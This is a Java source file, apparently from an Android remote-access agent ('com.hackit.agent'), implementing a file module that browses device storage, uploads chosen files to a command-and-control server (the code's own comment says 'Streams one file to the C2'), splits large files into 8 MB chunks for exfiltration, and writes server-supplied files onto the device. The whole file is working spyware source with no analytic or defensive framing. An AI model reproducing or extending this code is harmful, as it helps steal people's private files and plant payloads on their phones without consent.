package com.hackit.agent;

import android.content.Context;
import android.text.TextUtils;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Comparator;
import java.util.List;

/**
 * File browser over the storage the app can already read. Paths are resolved
 * against the external root; a relative path can never climb above it.
 */
final class Files {
    private static final int MAX_ENTRIES = 500;
    private static final long MAX_PULL = 400L * 1024L * 1024L;

    static File root(Context ctx) {
        File external = ctx.getExternalFilesDir(null);
        File base = external == null ? null : external.getParentFile() != null
                ? new File(external.getParentFile().getParentFile(), "0")
                : null;
        if (base != null && base.isDirectory()) {
            return base;
        }
        return android.os.Environment.getExternalStorageDirectory();
    }

    static File resolve(Context ctx, String raw) {
        String path = raw == null || raw.trim().isEmpty() ? "." : raw.trim();
        File candidate = new File(path);
        if (!candidate.isAbsolute()) {
            candidate = new File(root(ctx), path);
        }
        try {
            return candidate.getCanonicalFile();
        } catch (Exception exc) {
            return candidate;
        }
    }

    static JSONArray list(Context ctx, String raw) {
        JSONArray rows = new JSONArray();
        File dir = resolve(ctx, raw);
        if (!dir.isDirectory()) {
            File parent = dir.getParentFile();
            dir = parent == null ? dir : parent;
        }
        File[] children = dir.listFiles();
        if (children == null) {
            return rows;
        }
        List<File> ordered = new ArrayList<File>();
        Collections.addAll(ordered, children);
        Collections.sort(ordered, new Comparator<File>() {
            @Override
            public int compare(File a, File b) {
                if (a.isDirectory() != b.isDirectory()) {
                    return a.isDirectory() ? -1 : 1;
                }
                return a.getName().compareToIgnoreCase(b.getName());
            }
        });
        for (File child : ordered) {
            if (rows.length() >= MAX_ENTRIES) {
                break;
            }
            try {
                JSONObject row = new JSONObject();
                row.put("name", child.getName());
                row.put("path", child.getAbsolutePath());
                row.put("dir", child.isDirectory());
                row.put("size", child.isDirectory() ? 0 : child.length());
                row.put("mtime", child.lastModified() / 1000L);
                row.put("human", child.isDirectory() ? "" : Common.humanBytes(child.length()));
                if (child.isFile() && child.canRead()) {
                    row.put("readable", true);
                }
                rows.put(row);
            } catch (Exception ignored) {
            }
        }
        return rows;
    }

    /** Streams one file to the C2 and returns the local path that was sent. */
    static boolean pull(Context ctx, String raw) {
        File file = resolve(ctx, raw);
        if (!file.isFile() || !file.canRead()) {
            return false;
        }
        long length = file.length();
        if (length == 0 || length > MAX_PULL) {
            return false;
        }
        if (Net.upload(ctx, file, file.getName(), "file")) {
            return true;
        }
        return chunked(ctx, file);
    }

    /** Large files go in 8 MB pieces; the server stitches by name suffix. */
    private static boolean chunked(Context ctx, File file) {
        int chunks = (int) Math.ceil(file.length() / (8.0 * 1024 * 1024));
        if (chunks < 2 || chunks > 64) {
            return false;
        }
        boolean all = true;
        byte[] buffer = new byte[64 * 1024];
        for (int index = 0; index < chunks; index++) {
            File part = new File(ctx.getCacheDir(), file.getName() + ".part" + index);
            FileInputStream in = null;
            FileOutputStream out = null;
            try {
                in = new FileInputStream(file);
                long skip = index * 8L * 1024L * 1024L;
                long dropped = 0;
                while (dropped < skip) {
                    long step = in.skip(skip - dropped);
                    if (step <= 0) {
                        break;
                    }
                    dropped += step;
                }
                out = new FileOutputStream(part);
                long written = 0;
                int read;
                while (written < 8L * 1024L * 1024L && (read = in.read(buffer)) > 0) {
                    out.write(buffer, 0, read);
                    written += read;
                }
                out.flush();
                all &= Net.upload(ctx, part, file.getName() + "." + index + "of" + chunks, "file");
            } catch (Throwable exc) {
                Log.e("chunk: " + exc);
                all = false;
            } finally {
                Common.closeQuietly(in);
                Common.closeQuietly(out);
                //noinspection ResultOfMethodCallIgnored
                part.delete();
            }
            if (!all) {
                break;
            }
        }
        return all;
    }

    static String push(Context ctx, String raw, String token) {
        File target = resolve(ctx, raw);
        File parent = target.getParentFile();
        if (parent != null && !parent.exists() && !parent.mkdirs()) {
            return "mkdir failed: " + parent;
        }
        InputStream in = null;
        FileOutputStream out = null;
        boolean ok = Net.fetch(ctx, "/v1/download/" + Common.sid(ctx) + "/" + token, target);
        try {
            if (ok) {
                return "saved " + target + " (" + target.length() + " bytes)";
            }
            return "download failed";
        } finally {
            Common.closeQuietly(in);
            Common.closeQuietly(out);
        }
    }

    private Files() {
    }

    static String describe(Context ctx) {
        return root(ctx).getAbsolutePath() + (TextUtils.isEmpty(root(ctx).getAbsolutePath()) ? "" : "");
    }
}
